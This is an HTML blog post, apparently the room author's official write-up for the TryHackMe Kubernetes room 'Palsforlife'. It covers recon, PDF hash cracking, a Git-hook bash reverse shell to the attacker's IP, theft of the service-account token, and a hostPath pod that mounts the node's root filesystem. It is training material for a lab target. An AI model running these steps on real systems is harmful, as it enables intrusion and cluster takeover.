@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+      <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <meta name="google-site-verification" content="HdqGbEoqInZEWXvmPnmKkcqDkxqI6CsY71SwwETWSOI" />
+
+  <title>Palsforlife - Tryhackme | Thibaut Tauveron</title>
+  <meta name="description" content="Official Writeup for a room I created on tryhackme.com">
+  <meta name="author" content="Thibaut Tauveron"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Thibaut Tauveron",
+    
+    "url": "https:\/\/blog.ttauveron.com"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/blog.ttauveron.com"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/blog.ttauveron.com",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/blog.ttauveron.com\/posts\/tryhackme_palsforlife\/",
+          "name": "Palsforlife tryhackme"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "Thibaut Tauveron"
+  },
+  "headline": "Palsforlife - Tryhackme",
+  "description" : "TryHackMe is a platform to learn cyber security hands-on, they make it really fun to solve challenges and learn new tools \u0026amp; techniques. Making my way through challenges, I noticed there was only one room involving Kubernetes.\nAs Kubernetes has gained quite some popularity over the last few years, k8s clusters are now interesting targets so it\u0026rsquo;s good to learn how a cluster can be compromised to be better at securing it, that\u0026rsquo;s why I designed and proposed a room called palsforlife about k8s (and world of warcraft!",
+  "inLanguage" : "en",
+  "wordCount":  928 ,
+  "datePublished" : "2021-06-01T00:00:00",
+  "dateModified" : "2021-06-01T00:00:00",
+  "image" : "https:\/\/blog.ttauveron.com",
+  "keywords" : [ "linux, security, pentest, tryhackme" ],
+  "mainEntityOfPage" : "https:\/\/blog.ttauveron.com\/posts\/tryhackme_palsforlife\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/blog.ttauveron.com",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/blog.ttauveron.com",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="Palsforlife - Tryhackme" />
+<meta property="og:description" content="Official Writeup for a room I created on tryhackme.com">
+<meta name="publish_date" property="og:publish_date" content='2021-06-01T00:00:00Z'>
+
+<meta property="og:url" content="https://blog.ttauveron.com/posts/tryhackme_palsforlife/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Thibaut Tauveron" />
+
+  <meta name="twitter:title" content="Palsforlife - Tryhackme" />
+  <meta name="twitter:description" content="Official Writeup for a room I created on tryhackme.com">
+  <meta name="twitter:card" content="summary" />
+  <link href='https://blog.ttauveron.com/img/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.88.1" />
+  <link rel="alternate" href="https://blog.ttauveron.com/index.xml" type="application/rss+xml" title="Thibaut Tauveron">
+  <link rel="stylesheet" href="https://blog.ttauveron.com/fontawesome/css/all.css" />
+  <link rel="stylesheet" href="https://blog.ttauveron.com/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://blog.ttauveron.com/css/syntax.css" />
+  <link rel="stylesheet" href="https://blog.ttauveron.com/css/main.css" />
+
+  </head>
+  <body>
+    
+
+<nav>
+  <div class="navbar-custom">
+    <div class="container">
+      <div class="row post-preview">
+        <div class="col-6 d-flex align-items-center me-auto">
+          <a class="header-title" href="https://blog.ttauveron.com">Thibaut Tauveron</a>
+        </div>
+        <div class="col-6 d-flex align-items-end flex-column">
+      <span class="fa-sm">
+        <a href="https://github.com/ttauveron" title="GitHub" class="fa-stack">
+          <div class="fab fa-github fa-stack-1x"></div>
+        </a>
+        <a href="https://linkedin.com/in/ttauveron" title="LinkedIn" class="fa-stack">
+          <div class="fab fa-linkedin fa-stack-1x"></div>
+        </a>
+        <a href="/index.xml" title="RSS" class="fa-stack">
+          <div class="fa fa-rss fa-stack-1x"></div>
+        </a>
+      </span>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</nav>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <article role="main" class="blog-post">
+      <h1>Palsforlife - Tryhackme</h1>
+      <span class="date">Tuesday, June 1, 2021</span>
+      <p><a href="https://tryhackme.com/">TryHackMe</a> is a platform to learn cyber security hands-on, they make it really fun to solve challenges and learn new tools &amp; techniques.
+Making my way through challenges, I noticed there was only one room involving Kubernetes.</p>
+<p>As Kubernetes has gained quite some popularity over the last few years, k8s clusters are now interesting targets so it&rsquo;s good to learn how a cluster can be compromised to be better at securing it, that&rsquo;s why I designed and proposed a room called <a href="https://tryhackme.com/room/palsforlife">palsforlife</a> about k8s (and world of warcraft!) some time ago.</p>
+<p>Here&rsquo;s a writeup for this challenge:</p>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<p>First, we need to wait 5 minutes for the machine to fully boot up.
+To makes things a bit more convenient, edit your <code>/etc/hosts</code> file, adding a <code>hive.thm</code> entry to save your target IP:</p>
+<pre tabindex="0"><code>x.x.x.x   palsforlife.thm
+</code></pre><p>Let&rsquo;s start with nmap:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nmap -A -T4 -p- palsforlife.thm -vv
+</code></pre></div><pre tabindex="0"><code>PORT      STATE SERVICE           REASON  VERSION
+22/tcp    open  ssh               syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+6443/tcp  open  ssl/sun-sr-https? syn-ack
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 401 Unauthorized
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     Date: Tue, 16 Aug 2022 23:27:26 GMT
+|     Content-Length: 129
+|     {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;Unauthorized&quot;,&quot;reason&quot;:&quot;Unauthorized&quot;,&quot;code&quot;:401}
+| ssl-cert: Subject: commonName=k3s/organizationName=k3s
+| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, DNS:palsforlife.thm, IP Address:10.10.162.251, IP Address:10.43.0.1, IP Address:127.0.0.1, IP Address:172.30.18.136, IP Address:192.168.1.244
+| Issuer: commonName=k3s-server-ca@1622498168
+10250/tcp open  ssl/http          syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+| ssl-cert: Subject: commonName=palsforlife
+| Subject Alternative Name: DNS:palsforlife, DNS:localhost, IP Address:127.0.0.1, IP Address:10.10.162.251
+| Issuer: commonName=k3s-server-ca@1622498168
+30180/tcp open  http              syn-ack nginx 1.21.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: nginx/1.21.0
+|_http-title: 403 Forbidden
+31111/tcp open  unknown           syn-ack
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head data-suburl=&quot;&quot;&gt;
+|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
+|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;
+|     &lt;meta name=&quot;theme-color&quot; content=&quot;#6cc644&quot;&gt;
+|     &lt;meta name=&quot;author&quot; content=&quot;Gitea - Git with a cup of tea&quot; /&gt;
+|     &lt;meta name=&quot;description&quot; content=&quot;Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go&quot; /&gt;
+|     &lt;meta name=&quot;keywords&quot; content=&quot;go,git,self-hosted,gitea
+31112/tcp open  ssh               syn-ack OpenSSH 7.5 (protocol 2.0)
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 01:28
+Completed NSE at 01:28, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 01:28
+Completed NSE at 01:28, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 01:28
+Completed NSE at 01:28, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 419.02 seconds
+</code></pre><p>(the nmap log has been slightly redacted for readability)</p>
+<p>We learn a few interesting things :</p>
+<ul>
+<li>10250 seems to indicate there is a kubernetes api server (k3s-server)</li>
+<li>30180 points to a nginx server</li>
+<li>31111 points to a gitea</li>
+</ul>
+<p>Let&rsquo;s run dirsearch (or gobuster) on the nginx:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">dirsearch -u http://palsforlife.thm:30180/
+</code></pre></div><pre tabindex="0"><code>  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903
+
+Target: http://palsforlife.thm:30180/
+
+[01:39:10] Starting: 
+[01:39:41] 200 -   13KB - /team/
+
+Task Completed
+&lt;dirsearch.dirsearch.Program object at 0x7f6e7f2fadf0&gt;
+</code></pre><p>We find a page at <a href="http://palsforlife.thm:30180/team/">http://palsforlife.thm:30180/team/</a> :</p>
+<figure><img src="https://i.imgur.com/j1nvW9F.png" width="100%"/>
+</figure>
+
+<p>Let&rsquo;s go there and display the sources.</p>
+<p>There is an interesting anchor:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- I shouldn&#39;t forget this --&gt;</span>
+      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;uninteresting_file.pdf&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;visibility: hidden; display: none;&#34;</span><span class="p">&gt;</span>[BASE64]<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</code></pre></div><p>Copy this found base64 in a <code>base64_content</code> file.</p>
+<p>Recover the file from the base64.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">cat base64_content <span class="p">|</span> base64 --decode &gt; uninteresting_file.pdf
+</code></pre></div><p>Use pdf2john to get the hash from the password protected pdf file and crack it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pdf2john.pl uninteresting_file.pdf &gt; hash.txt
+john --wordlist<span class="o">=</span>rockyou.txt hash.txt
+</code></pre></div><p>Open pdf with the found password, it looks like it contains another password.</p>
+<p>Use this password found in the pdf to login to gitea as leeroy at <a href="http://palsforlife.thm:31111">http://palsforlife.thm:31111</a></p>
+<figure><img src="https://i.imgur.com/Eh8hwLW.png" width="100%"/>
+</figure>
+
+<p>There is a repo already created, let&rsquo;s look into its webhooks.</p>
+<p>We find that a webhook has already been created, let&rsquo;s edit it and inspect the secret field to find the first flag.</p>
+<h1 id="gaining-system-access">Gaining System Access</h1>
+<p>Next, let&rsquo;s abuse Git hooks.</p>
+<p>Inject a reverse shell in the post-receive hook.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/YOUR_LOCAL_IP/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div><figure><img src="https://i.imgur.com/OSFX3Yb.png" width="100%"/>
+</figure>
+
+<p>Run a netcat listener on the attack machine:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nc -lvnp <span class="m">4444</span>
+</code></pre></div><p>Clone the repo and push some modifications :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git clone http://palsforlife.thm:31111/leeroy/jenkins.git
+<span class="nb">cd</span> jenkins
+touch <span class="nb">test</span>
+git add <span class="nb">test</span>
+git ci -m <span class="s2">&#34;test&#34;</span>
+git push origin master
+</code></pre></div><p>We then get a reverse shell on the machine!</p>
+<p>Get the second flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">cat /root/flag2.txt
+</code></pre></div><p>Get the kubernetes service account token:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">cat /var/run/secrets/kubernetes.io/serviceaccount/token
+</code></pre></div><p>Save it in a token.txt file on the attack machine.</p>
+<p>What can we do with this token?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kubectl --token <span class="s2">&#34;</span><span class="k">$(</span>cat token.txt<span class="k">)</span><span class="s2">&#34;</span> --insecure-skip-tls-verify --server<span class="o">=</span>https://palsforlife.thm:6443 auth can-i --list
+</code></pre></div><p>Apparently everything :</p>
+<pre tabindex="0"><code>Resources   Non-Resource URLs   Resource Names   Verbs
+*.*         []                  []               [*]
+            [*]                 []               [*]
+</code></pre><p>That&rsquo;s what happen when RBAC is not enabled in the cluster :-)</p>
+<p>Find the 3rd flag in a secret resource.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kubectl --token <span class="s2">&#34;</span><span class="k">$(</span>cat token.txt<span class="k">)</span><span class="s2">&#34;</span> --insecure-skip-tls-verify --server<span class="o">=</span>https://palsforlife.thm:6443 -n kube-system get secret flag3 -o json <span class="p">|</span> jq -r <span class="s1">&#39;.data | map_values(@base64d)&#39;</span>
+</code></pre></div><h1 id="privilege-escalation">Privilege escalation</h1>
+<p>Look at the docker images that are available in the node:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kubectl --token <span class="s2">&#34;</span><span class="k">$(</span>cat token.txt<span class="k">)</span><span class="s2">&#34;</span> --insecure-skip-tls-verify --server<span class="o">=</span>https://team.thm:6443 get node -o yaml
+</code></pre></div><p>Let&rsquo;s use the nginx image</p>
+<pre tabindex="0"><code>docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750)
+</code></pre><p>host.yaml</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">host</span><span class="w">
+</span><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span><span class="w">  </span>- <span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750</span><span class="w">
+</span><span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">host</span><span class="w">
+</span><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w">
+</span><span class="w">    </span>- <span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/host</span><span class="w">
+</span><span class="w">      </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">host</span><span class="w">
+</span><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">host</span><span class="w">
+</span><span class="w">    </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">
+</span><span class="w">      </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
+</span><span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">Directory</span><span class="w">
+</span></code></pre></div><p>and then run:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kubectl --token <span class="s2">&#34;</span><span class="k">$(</span>cat token.txt<span class="k">)</span><span class="s2">&#34;</span> --insecure-skip-tls-verify --server<span class="o">=</span>https://team.thm:6443 -n default apply -f host.yaml
+</code></pre></div><p>Access the newly created pod:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kubectl --token <span class="s2">&#34;</span><span class="k">$(</span>cat token.txt<span class="k">)</span><span class="s2">&#34;</span> --insecure-skip-tls-verify --server<span class="o">=</span>https://team.thm:6443 -n default <span class="nb">exec</span> -it host bash
+</code></pre></div><p>We just mounted the node filesystem!</p>
+<p>Let&rsquo;s get the root flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">cat /host/root/root.txt
+</code></pre></div><p>And we&rsquo;re done! Congrats!!</p>
+
+      
+      <div class="blog-tags">
+        
+        <a href="https://blog.ttauveron.com/tags/linux/">linux</a>&nbsp;
+        
+        <a href="https://blog.ttauveron.com/tags/security/">security</a>&nbsp;
+        
+        <a href="https://blog.ttauveron.com/tags/pentest/">pentest</a>&nbsp;
+        
+        <a href="https://blog.ttauveron.com/tags/tryhackme/">tryhackme</a>&nbsp;
+        
+      </div>
+      
+    </article>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="d-flex justify-content-center">
+        <p class="credits copyright text-muted">
+          Thibaut Tauveron
+          &nbsp;&bull;&nbsp;&copy;
+            2022
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+  </body>
+</html>
+
